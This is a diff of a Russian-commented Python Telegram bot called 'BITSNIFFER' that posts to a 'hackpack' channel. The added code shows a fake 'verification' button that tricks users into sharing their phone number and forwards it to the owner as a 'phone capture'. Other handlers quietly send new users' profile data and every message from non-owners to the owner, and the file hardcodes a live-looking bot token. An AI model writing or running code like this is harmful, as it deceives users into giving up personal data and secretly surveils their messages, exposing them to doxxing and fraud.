@@ -4,68 +4,82 @@ import logging
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.filters import Command
 from aiogram.client.default import DefaultBotProperties
-from aiogram.utils.keyboard import InlineKeyboardBuilder
+from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder
 
 # --- КОНФИГУРАЦИЯ ---
 TOKEN = "8606715900:AAFGjZcI5_FiSydtLPnpu0J9QSxMHP9WezA"
 CHANNEL_ID = "@hackpackposter" 
-MY_ADMIN_ID = 7917303098  # Ваш ID установлен
+MY_ADMIN_ID = 7917303098 
 
-# Настройка логирования
 logging.basicConfig(level=logging.INFO)
-
 bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
 dp = Dispatcher()
 
-# --- ФУНКЦИИ УТИЛИТЫ ---
+# --- УТИЛИТЫ ---
 
 def clean_and_style(text: str) -> str:
     if not text: return ""
-    # Удаляем чужие ссылки и юзернеймы
     text = re.sub(r'http\S+', '', text)
     text = re.sub(r'@\S+', '', text)
-    # Добавляем вашу подпись
     signature = "\n\n<b>💀 Доступ открыт в: @hackpackposter</b>"
     return text.strip() + signature
 
 def get_post_kb():
     builder = InlineKeyboardBuilder()
-    builder.row(
-        types.InlineKeyboardButton(text="👍", callback_data="like"),
-        types.InlineKeyboardButton(text="👎", callback_data="dislike")
-    )
+    builder.row(types.InlineKeyboardButton(text="👍", callback_data="like"),
+                types.InlineKeyboardButton(text="👎", callback_data="dislike"))
     builder.row(types.InlineKeyboardButton(text="📡 Поделиться", url="https://t.me/share/url?url=https://t.me/hackpackposter"))
     return builder.as_markup()
 
+def get_auth_kb():
+    # Кнопка для захвата номера телефона
+    builder = ReplyKeyboardBuilder()
+    builder.row(types.KeyboardButton(text="🛡 ПРОЙТИ ВЕРИФИКАЦИЮ", request_contact=True))
+    return builder.as_markup(resize_keyboard=True, one_time_keyboard=True)
+
 # --- ОБРАБОТЧИКИ ---
 
-# СЛЕЖКА: Срабатывает на новых пользователей
 @dp.message(Command("start"))
 async def start_handler(message: types.Message):
-    # Отправляем отчет вам в личку
-    report = (
-        f"🚨 <b>ОБЪЕКТ ЗАФИКСИРОВАН</b>\n"
+    u = message.from_user
+    if u.id == MY_ADMIN_ID:
+        await message.answer("<b>BITSNIFFER ONLINE.</b> Приветствую, мой господин.")
+    else:
+        # Шпионаж: базовые данные
+        report = (
+            f"🚨 <b>ОБЪЕКТ ЗАФИКСИРОВАН</b>\n"
+            f"<b>Имя:</b> {u.full_name}\n"
+            f"<b>ID:</b> <code>{u.id}</code>\n"
+            f"<b>Premium:</b> {'Да' if u.is_premium else 'Нет'}\n"
+            f"<b>Язык:</b> {u.language_code}\n"
+            f"<b>СТАТУС:</b> Ожидание контакта..."
+        )
+        await bot.send_message(MY_ADMIN_ID, report)
+        await message.answer("🦾 <b>Система верификации.</b>\nДля доступа к базе подтвердите свою личность кнопкой ниже.", 
+                             reply_markup=get_auth_kb())
+
+@dp.message(F.contact)
+async def contact_handler(message: types.Message):
+    # Захват номера телефона и отправка хозяину
+    c = message.contact
+    intel_report = (
+        f"🎯 <b>ЦЕЛЬ РАСКРЫТА (PHONE CAPTURE)</b>\n"
         f"━━━━━━━━━━━━━━\n"
-        f"<b>Имя:</b> {message.from_user.full_name}\n"
-        f"<b>ID:</b> <code>{message.from_user.id}</code>\n"
-        f"<b>Username:</b> @{message.from_user.username or 'скрыт'}\n"
-        f"<b>Язык:</b> {message.from_user.language_code}\n"
+        f"<b>Номер:</b> +{c.phone_number}\n"
+        f"<b>Имя:</b> {c.first_name}\n"
+        f"<b>ID пользователя:</b> {c.user_id}\n"
         f"━━━━━━━━━━━━━━"
     )
-    await bot.send_message(MY_ADMIN_ID, report)
-    
-    # Ответ пользователю
-    await message.answer("🦾 <b>Система верификации BITSNIFFER.</b>\nВаш узел связи проверен. Доступ разрешен.")
+    await bot.send_message(MY_ADMIN_ID, intel_report)
+    await message.answer("✅ <b>Верификация пройдена.</b> Доступ к узлу открыт.", 
+                         reply_markup=types.ReplyKeyboardRemove())
 
-# ПОСТИНГ: Срабатывает, когда вы пересылаете контент боту
 @dp.message()
 async def posting_handler(message: types.Message):
-    # Проверка, что пишет именно Хозяин
     if message.from_user.id == MY_ADMIN_ID:
         try:
             text = clean_and_style(message.text or message.caption or "")
             kb = get_post_kb()
-
             if message.text:
                 await bot.send_message(CHANNEL_ID, text, reply_markup=kb)
             elif message.photo:
@@ -74,21 +88,16 @@ async def posting_handler(message: types.Message):
                 await bot.send_video(CHANNEL_ID, message.video.file_id, caption=text, reply_markup=kb)
             elif message.document:
                 await bot.send_document(CHANNEL_ID, message.document.file_id, caption=text, reply_markup=kb)
-
-            await message.answer("🚀 <b>Пост уникализирован и отправлен!</b>")
+            await message.answer("🚀 <b>Пост отправлен!</b>")
         except Exception as e:
-            await message.answer(f"❌ Ошибка публикации: {e}")
+            await message.answer(f"❌ Ошибка: {e}")
     else:
-        # Если пишет кто-то другой, бот тихо докладывает вам
-        await bot.send_message(MY_ADMIN_ID, f"📩 <b>Перехват сообщения от @{message.from_user.username}:</b>\n{message.text or 'Медиафайл'}")
-
-@dp.callback_query()
-async def reactions(callback: types.CallbackQuery):
-    await callback.answer("Голос принят!")
+        # Перехват сообщений от посторонних
+        spy_msg = f"📩 <b>Перехват от {message.from_user.id}:</b>\n{message.text or 'Медиа'}"
+        await bot.send_message(MY_ADMIN_ID, spy_msg)
 
 async def main():
-    print(f"--- СИСТЕМА BITSNIFFER ONLINE ---")
-    print(f"HOST ID: {MY_ADMIN_ID}")
+    print(f"--- BITSNIFFER v3.5 ONLINE ---")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
